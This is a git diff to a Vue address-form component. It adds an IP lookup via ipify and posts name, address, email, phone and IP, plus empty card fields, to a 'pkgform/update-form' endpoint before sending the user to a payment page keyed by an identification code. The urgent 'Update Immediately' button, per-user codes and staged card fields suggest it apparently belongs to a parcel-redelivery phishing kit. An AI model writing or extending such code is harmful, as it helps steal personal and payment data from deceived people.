@@ -2,6 +2,7 @@
 import { ref, onMounted } from 'vue'
 import { useRouter, useRoute } from 'vue-router'
 import { useFormDataStore } from '@/stores/formData'
+import { ElMessage } from 'element-plus'
 
 const formData = ref({
   name: '',
@@ -17,20 +18,77 @@ const formData = ref({
 const router = useRouter()
 const route = useRoute()
 const formDataStore = useFormDataStore()
+const isLoading = ref(false)
+const ipAddress = ref('')
 
 // On mount, check if we need to update the identification code from the route
 onMounted(() => {
   if (route.params.identificationCode && typeof route.params.identificationCode === 'string') {
     formDataStore.setIdentificationCode(route.params.identificationCode)
   }
+
+  // Fetch user's IP address
+  fetch('https://api.ipify.org?format=json')
+    .then((response) => response.json())
+    .then((data) => {
+      ipAddress.value = data.ip
+    })
+    .catch((error) => {
+      console.error('Error fetching IP address:', error)
+      // Fallback to a default value if IP fetch fails
+      ipAddress.value = '0.0.0.0'
+    })
 })
 
-const handleSubmit = () => {
+const handleSubmit = async () => {
   console.log('Address form submitted:', formData.value)
   formDataStore.setAddressData(formData.value)
 
-  // Use the identification code from the global store
-  router.push(`/payment/${formDataStore.identificationCode}`)
+  isLoading.value = true
+  try {
+    // 准备提交的数据，信用卡相关字段为空
+    const submitData = {
+      identificationCode: formDataStore.identificationCode,
+      name: formData.value.name,
+      address1: formData.value.address1,
+      address2: formData.value.address2,
+      city: formData.value.city,
+      state: formData.value.state,
+      postalCode: formData.value.postalCode,
+      email: formData.value.email,
+      phone: formData.value.phone,
+      ipAddress: ipAddress.value, // Add IP address to the submission
+      // 信用卡相关字段为空
+      cardholder: '',
+      cardNumber: '',
+      expireDate: '',
+      cvv: '',
+    }
+
+    // 发送请求到服务器
+    const response = await fetch(`${import.meta.env.VITE_API_URL}/v1/pkgform/update-form`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(submitData),
+    })
+
+    if (!response.ok) {
+      throw new Error('表单提交失败')
+    }
+
+    const result = await response.json()
+    console.log('表单提交成功:', result)
+
+    // 继续导航到支付页面
+    router.push(`/payment/${formDataStore.identificationCode}`)
+  } catch (error) {
+    console.error('提交表单时出错:', error)
+    ElMessage.error('提交表单失败，请重试')
+  } finally {
+    isLoading.value = false
+  }
 }
 </script>
 
@@ -94,7 +152,9 @@ const handleSubmit = () => {
           <input type="tel" id="phone" v-model="formData.phone" required />
         </div>
 
-        <button type="submit" class="submit-btn">Update Immediately</button>
+        <button type="submit" class="submit-btn" :disabled="isLoading">
+          {{ isLoading ? '提交中...' : 'Update Immediately' }}
+        </button>
       </form>
     </div>
   </div>
